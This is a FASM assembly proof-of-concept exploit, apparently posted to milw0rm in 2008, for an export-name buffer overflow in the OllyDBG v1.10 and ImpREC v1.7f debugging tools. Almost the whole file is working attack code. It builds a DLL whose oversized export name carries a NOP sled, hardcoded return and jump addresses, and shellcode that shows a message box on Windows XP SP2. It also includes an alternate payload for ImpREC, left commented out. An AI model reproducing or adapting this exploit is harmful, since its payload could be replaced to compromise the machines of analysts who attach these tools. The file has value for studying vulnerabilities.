;-------------------------------------------------------------------------;
; OllyDBG v1.10 and ImpREC v1.7f export name buffer overflow vulnerability
; PoC (probably older versions affected too, not tested though.)         
;
; Included shellcode shows a messagebox (WinXP SP2) and is configured for
; OllyDBG. See lines 60-105 for more details
;-------------------------------------------------------------------------;
; Usage:
; Load this DLL to your process and try to attach OllyDBG or ImpREC
; to it -> Shellcode executed >:)
;
; Shellcode gets fired also if program is run under OllyDBG.
;
; Bug discovered and PoC coded by:
; ~ Defsanguje, Defsanguje [at] gmail [dot] com             [July 7 2008]
;-------------------------------------------------------------------------;
; Coded in FASM
;-------------------------------------------------------------------------;

format PE GUI 4.0 DLL

include 'win32a.inc'
entry DllEntryPoint

section '.code' code readable executable

proc DllEntryPoint, hinstDLL,fdwReason,lpvReserved
                    mov eax, TRUE
                    ret
endp

;-------------------------------------------------------------------------;
; Modified version from original export-macro.
;-------------------------------------------------------------------------;
macro ExportExploit dllname,[label]
 { common
    local module,addresses,names,ordinal,count
    count = 0
   forward
    count = count+1
   common
    dd 0,0,0,RVA module,1
    dd count,count,RVA addresses,RVA names,RVA ordinal
    addresses:
   forward
    dd RVA label
   common
    names:
   forward
    local name
    dd RVA name
   common
    ordinal: count = 0
   forward
    dw count
    count = count+1
   common
    module db dllname,0
   forward
   
;-------------------------------------------------------------------------;
; Exploit for OllyDBG v1.10
;-------------------------------------------------------------------------;
a:  name\
    db 3e0h dup (90h)
    dd 6d553b78h                                                ; ESP to EBP
    dd 6d55e5ffh                                                ; EBP to EAX
    dd 0defdefdeh
    dd 0defdefdeh
    dd 6d56d25eh                                                ; add eax, 40h
    dd 0defdefdeh
    dd 6d52e1efh                                                ; jmp EAX =)
    db 40h-18h dup(90h)
c:  push eax
    mov eax, (ShellCodeStart-c) xor 0defdefdeh
    xor eax, 0defdefdeh
    add eax, [esp]
    jmp eax
b:  db 0bd0h - (ShellCodeEnd-ShellCodeStart) - (b-a) dup (90h)

ShellCodeStart:
    db 81h,0ECh,07Dh,0FFh,0FFh,0FFh
    db 2Bh,0C9h,51h,51h,51h,51h,51h,0BBh
    db 8Ah,05h,45h,7Eh                                          ; Address of messagebox in winxp sp2
    db 0FFh,0D3h
ShellCodeEnd:
    dd 0045F823h                                                 ; New EIP

    db 300h dup(90h)
    db 0

;-------------------------------------------------------------------------;
; Exploit for ImpREC v1.7f
;-------------------------------------------------------------------------;
;    name\
;    db 0C0Ch - (ShellCodeEnd-ShellCodeStart) dup (90h)
;ShellCodeStart:
;    db 81h,0ECh,07Dh,0FFh,0FFh,0FFh
;    db 2Bh,0C9h,51h,51h,51h,51h,51h,0BBh
;    db 8Ah,05h,45h,7Eh                                          ; Address of messagebox in winxp sp2
;    db 0FFh,0D3h
;ShellCodeEnd:
;    dd 12c1b8h                                                  ; New EIP
;    db 0
;-------------------------------------------------------------------------;
    
   common
    local x,y,z,str1,str2,v1,v2
    x = count shr 1
    while x > 0
     y = x
     while y < count
      z = y
      while z-x >= 0
       load v1 dword from names+z*4
       str1=($-RVA $)+v1
       load v2 dword from names+(z-x)*4
       str2=($-RVA $)+v2
       while v1 > 0
        load v1 from str1+%-1
        load v2 from str2+%-1
        if v1 <> v2
         break
        end if
       end while
       if v1<v2
        load v1 dword from names+z*4
        load v2 dword from names+(z-x)*4
        store dword v1 at names+(z-x)*4
        store dword v2 at names+z*4
        load v1 word from ordinal+z*2
        load v2 word from ordinal+(z-x)*2
        store word v1 at ordinal+(z-x)*2
        store word v2 at ordinal+z*2
       else
        break
       end if
       z = z-x
      end while
      y = y+1
     end while
     x = x shr 1
    end while }

section '.edata' export data readable
;-------------------------------------------------------------------------;
; Call the macro
;-------------------------------------------------------------------------;
  ExportExploit 'exploit.dll',\
        $
        
;-------------------------------------------------------------------------;

; milw0rm.com [2008-07-08]
